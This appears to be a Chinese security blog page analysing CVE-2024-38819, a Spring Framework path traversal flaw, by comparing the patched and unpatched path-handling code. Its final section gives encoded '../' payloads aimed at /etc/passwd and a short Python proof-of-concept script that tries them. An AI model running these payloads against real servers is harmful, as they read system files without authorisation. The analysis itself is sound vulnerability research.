@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="CVE-2024-38819https:&#x2F;&#x2F;spring.io&#x2F;security&#x2F;cve-2024-38819通过功能性 Web 框架 WebMvc.fn 或 WebFlux.fn 提供静态资源的应用程序容易受到路径遍历攻击。攻击者可以构建恶意 HTTP 请求，并获取文件系统上任何文件，这些文件也可以被运行 Spring 应用程序的进程访问。这与 CVE-2024-38816 类似，但输入不同。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【CVE分析】2024年10月份">
+<meta property="og:url" content="https://godreams.cn/2024/10/18/WebSecurity/cvedaily/20241018/index.html">
+<meta property="og:site_name" content="g0dam">
+<meta property="og:description" content="CVE-2024-38819https:&#x2F;&#x2F;spring.io&#x2F;security&#x2F;cve-2024-38819通过功能性 Web 框架 WebMvc.fn 或 WebFlux.fn 提供静态资源的应用程序容易受到路径遍历攻击。攻击者可以构建恶意 HTTP 请求，并获取文件系统上任何文件，这些文件也可以被运行 Spring 应用程序的进程访问。这与 CVE-2024-38816 类似，但输入不同。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://godreams.cn/2024/10/18/WebSecurity/cvedaily/20241018/image.png">
+<meta property="og:image" content="https://godreams.cn/2024/10/18/WebSecurity/cvedaily/20241018/image-1.png">
+<meta property="og:image" content="https://godreams.cn/2024/10/18/WebSecurity/cvedaily/20241018/image-2.png">
+<meta property="article:published_time" content="2024-10-18T10:05:33.000Z">
+<meta property="article:modified_time" content="2024-10-18T12:09:38.627Z">
+<meta property="article:author" content="g0dam">
+<meta property="article:tag" content="CVE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://godreams.cn/2024/10/18/WebSecurity/cvedaily/20241018/image.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>【CVE分析】2024年10月份</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="g0dam" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/idea/">Idea</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/10/18/WebSecurity/webshell/webshellevasion/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://godreams.cn/2024/10/18/WebSecurity/cvedaily/20241018/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://godreams.cn/2024/10/18/WebSecurity/cvedaily/20241018/&text=【CVE分析】2024年10月份"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://godreams.cn/2024/10/18/WebSecurity/cvedaily/20241018/&title=【CVE分析】2024年10月份"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godreams.cn/2024/10/18/WebSecurity/cvedaily/20241018/&is_video=false&description=【CVE分析】2024年10月份"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【CVE分析】2024年10月份&body=Check out this article: https://godreams.cn/2024/10/18/WebSecurity/cvedaily/20241018/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://godreams.cn/2024/10/18/WebSecurity/cvedaily/20241018/&title=【CVE分析】2024年10月份"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://godreams.cn/2024/10/18/WebSecurity/cvedaily/20241018/&title=【CVE分析】2024年10月份"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://godreams.cn/2024/10/18/WebSecurity/cvedaily/20241018/&title=【CVE分析】2024年10月份"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://godreams.cn/2024/10/18/WebSecurity/cvedaily/20241018/&title=【CVE分析】2024年10月份"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://godreams.cn/2024/10/18/WebSecurity/cvedaily/20241018/&name=【CVE分析】2024年10月份&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://godreams.cn/2024/10/18/WebSecurity/cvedaily/20241018/&t=【CVE分析】2024年10月份"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2024-38819"><span class="toc-number">1.</span> <span class="toc-text">CVE-2024-38819</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        【CVE分析】2024年10月份
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">g0dam</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-10-18T10:05:33.000Z" class="dt-published" itemprop="datePublished">2024-10-18</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Web-Security/">Web Security</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CVE/" rel="tag">CVE</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="CVE-2024-38819"><a href="#CVE-2024-38819" class="headerlink" title="CVE-2024-38819"></a>CVE-2024-38819</h2><p><a target="_blank" rel="noopener" href="https://spring.io/security/cve-2024-38819">https://spring.io/security/cve-2024-38819</a><br>通过功能性 Web 框架 WebMvc.fn 或 WebFlux.fn 提供静态资源的应用程序容易受到路径遍历攻击。攻击者可以构建恶意 HTTP 请求，并获取文件系统上任何文件，这些文件也可以被运行 Spring 应用程序的进程访问。<br>这与 CVE-2024-38816 类似，但输入不同。</p>
+<p>Affected Spring Products and Versions<br>Spring Framework:<br>5.3.0 - 5.3.40<br>6.0.0 - 6.0.24<br>6.1.0 - 6.1.13<br>Older, unsupported versions are also affected</p>
+<p>看到6.1.x版本存在漏洞，而6.1.14版本不存在，我下载了13和14两个版本的代码，想要通过对比查看这个漏洞点在哪里<br>使用<strong>WinMerge</strong>对比代码发现在，webmvc目录下的代码存在如下差异：<br><img src="/2024/10/18/WebSecurity/cvedaily/20241018/image.png"></p>
+<p>来看下变更的代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 13版本</span></span><br><span class="line"><span class="keyword">protected</span> String <span class="title function_">processPath</span><span class="params">(String path)</span> &#123;</span><br><span class="line">		path = StringUtils.replace(path, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">		path = cleanDuplicateSlashes(path);</span><br><span class="line">		<span class="keyword">return</span> cleanLeadingSlash(path);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 14版本</span></span><br><span class="line"><span class="keyword">protected</span> String <span class="title function_">processPath</span><span class="params">(String path)</span> &#123;</span><br><span class="line">		path = StringUtils.replace(path, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">		path = cleanDuplicateSlashes(path);</span><br><span class="line">		path = cleanLeadingSlash(path);</span><br><span class="line">		<span class="keyword">return</span> normalizePath(path);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">normalizePath</span><span class="params">(String path)</span> &#123;</span><br><span class="line">		<span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> path;</span><br><span class="line">		<span class="keyword">if</span> (result.contains(<span class="string">&quot;%&quot;</span>)) &#123;</span><br><span class="line">			result = decode(result);</span><br><span class="line">			<span class="keyword">if</span> (result.contains(<span class="string">&quot;%&quot;</span>)) &#123;</span><br><span class="line">				result = decode(result);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (result.contains(<span class="string">&quot;../&quot;</span>)) &#123;</span><br><span class="line">				<span class="keyword">return</span> StringUtils.cleanPath(result);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> path;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">decode</span><span class="params">(String path)</span> &#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> URLDecoder.decode(path, StandardCharsets.UTF_8);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到主要是添加了上面的两个函数<code>normalizePath decode</code></p>
+<ol>
+<li><p><strong>路径规范化（<code>normalizePath</code> 方法的添加）</strong>：</p>
+<ul>
+<li>新代码中添加了<code>normalizePath</code>方法，这个方法更详尽地处理了路径中的编码问题。如果路径包含百分号（<code>%</code>），该方法将尝试解码路径，并在解码后再次验证路径是否含有<code>../</code>，如果有，则调用<code>StringUtils.cleanPath</code>来规范化路径。这增加了对路径编码漏洞的防护，可以防止攻击者利用编码后的特殊字符（如<code>%2e%2e%2f</code>对应<code>../</code>）进行攻击。</li>
+</ul>
+</li>
+<li><p><strong>路径解码逻辑（<code>decode</code> 方法的实现）</strong>：</p>
+<ul>
+<li>新增的<code>decode</code>方法尝试解码路径，如果解码失败，则返回空字符串。这样的处理减少了因解码失败导致的异常抛出，增强了代码的健壮性，并间接防止了可能的攻击。</li>
+</ul>
+</li>
+<li><p><strong>更严格的路径验证（改进<code>isInvalidPath</code> 和 <code>isInvalidEncodedInputPath</code> 方法）</strong>：</p>
+<ul>
+<li><code>isInvalidPath</code>方法现在直接返回<code>true</code>如果路径中包含<code>&quot;../&quot;</code>，这简化了检查逻辑，确保了路径中不包含向上级目录的跳转。</li>
+<li><code>isInvalidEncodedInputPath</code>方法对于包含百分号的路径，会在解码后对路径进行两次检查，一次是直接解码后，另一次是处理（正规化）解码后的路径。这样的双重检查可以更有效地捕捉到潜在的非法路径访问尝试。<br><img src="/2024/10/18/WebSecurity/cvedaily/20241018/image-1.png"><br>下面分析利用链<br><img src="/2024/10/18/WebSecurity/cvedaily/20241018/image-2.png"><br>通过test可以看到是类似这样的资源访问会触发，接下来尝试构造poc</li>
+</ul>
+</li>
+<li><p><strong>构建请求</strong>：</p>
+<ul>
+<li>尝试通过多重编码的路径来绕过可能的单层路径过滤。</li>
+<li>示例路径：<code>http://example.com/resources/../../../../../../../../../etc/passwd</code></li>
+<li>使用编码避免过滤：<code>http://example.com/resources/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</code></li>
+<li>更多编码层次：<code>http://example.com/resources/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd</code></li>
+</ul>
+</li>
+<li><p><strong>构建测试脚本</strong>（使用Python）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_path_traversal</span>(<span class="params">url_base</span>):</span><br><span class="line">    <span class="comment"># 不同层次的编码测试</span></span><br><span class="line">    paths = [</span><br><span class="line">        <span class="string">&quot;/../../../../../../../../../etc/passwd&quot;</span>,  <span class="comment"># 无编码</span></span><br><span class="line">        <span class="string">&quot;/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd&quot;</span>,  <span class="comment"># 单次编码</span></span><br><span class="line">        <span class="string">&quot;/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd&quot;</span>  <span class="comment"># 多次编码</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> path <span class="keyword">in</span> paths:</span><br><span class="line">        full_url = <span class="string">f&quot;<span class="subst">&#123;url_base&#125;</span><span class="subst">&#123;path&#125;</span>&quot;</span></span><br><span class="line">        response = requests.get(full_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;root:&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Vulnerable to path traversal at <span class="subst">&#123;full_url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Secure against path traversal at <span class="subst">&#123;full_url&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    test_path_traversal(<span class="string">&quot;http://example.com/resources&quot;</span>)</span><br></pre></td></tr></table></figure></li>
+</ol>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/categories/">Categories</a></li>
+        
+          <li><a href="/idea/">Idea</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2024-38819"><span class="toc-number">1.</span> <span class="toc-text">CVE-2024-38819</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://godreams.cn/2024/10/18/WebSecurity/cvedaily/20241018/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://godreams.cn/2024/10/18/WebSecurity/cvedaily/20241018/&text=【CVE分析】2024年10月份"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://godreams.cn/2024/10/18/WebSecurity/cvedaily/20241018/&title=【CVE分析】2024年10月份"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godreams.cn/2024/10/18/WebSecurity/cvedaily/20241018/&is_video=false&description=【CVE分析】2024年10月份"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【CVE分析】2024年10月份&body=Check out this article: https://godreams.cn/2024/10/18/WebSecurity/cvedaily/20241018/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://godreams.cn/2024/10/18/WebSecurity/cvedaily/20241018/&title=【CVE分析】2024年10月份"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://godreams.cn/2024/10/18/WebSecurity/cvedaily/20241018/&title=【CVE分析】2024年10月份"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://godreams.cn/2024/10/18/WebSecurity/cvedaily/20241018/&title=【CVE分析】2024年10月份"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://godreams.cn/2024/10/18/WebSecurity/cvedaily/20241018/&title=【CVE分析】2024年10月份"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://godreams.cn/2024/10/18/WebSecurity/cvedaily/20241018/&name=【CVE分析】2024年10月份&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://godreams.cn/2024/10/18/WebSecurity/cvedaily/20241018/&t=【CVE分析】2024年10月份"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024
+    g0dam
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/idea/">Idea</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'owner/githubrepo';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
